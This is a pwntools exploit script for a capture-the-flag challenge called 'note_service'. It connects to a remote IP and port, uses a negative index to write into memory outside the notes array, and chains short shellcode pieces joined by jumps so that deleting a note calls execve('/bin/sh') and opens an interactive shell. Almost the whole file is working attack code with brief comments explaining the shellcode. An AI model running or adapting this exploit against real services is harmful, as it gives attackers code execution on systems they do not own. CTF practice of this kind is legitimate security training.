#coding:utf8
from pwn import *
from LibcSearcher import *
# import pwnlib
# io=process('./note_service')
io = remote('111.200.241.244',63042)
# def debug():
# 	pwnlib.gdb.attach(p)
# p=remote('pwn.buuoj.cn',20002)
# p=remote('111.200.241.244',59942)
context.log_level = 'debug'
# context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']
context(os='linux', arch='amd64', log_level='debug')
# context(os='linux',arch='amd64')
# sh = process('./ret2libc164')
# gdb.attach(p)
def add_note(index, size, content):
    io.recvuntil('your choice>> ')
    io.sendline('1')
    io.recvuntil('index:')
    io.sendline(str(index))
    io.recvuntil('size:')
    io.sendline(str(size))
    io.recvuntil('content:')
    io.sendline(content)

def del_note(index):
    io.recvuntil('your choice>> ')
    io.sendline('4')
    io.recvuntil('index:')
    io.sendline(str(index))

    # mov rdi, xxxx; / bin / sh字符串的地址
    # mov  rax, 59; execve的系统调用号,rax,eax,ax,ah,al其实是表示同一个寄存器，只是包含不同的范围
    # mov rsi, 0;
    # mov rdx, 0
    # syscall
    # jmp short xxx as \xeb  xxx :\x19

add_note(0,8,'/bin/sh')
add_note(-17,8,asm('xor rdx,rdx') + '\x90\x90\xeb\x19')
add_note(1,8,asm('xor rsi,rsi') + '\x90\x90\xeb\x19')
add_note(2,8,asm('mov eax,0x3b') .ljust(5, b'\x90') + b'\xeb\x19')
add_note(3,8,asm('syscall'))
del_note(0)

io.interactive()




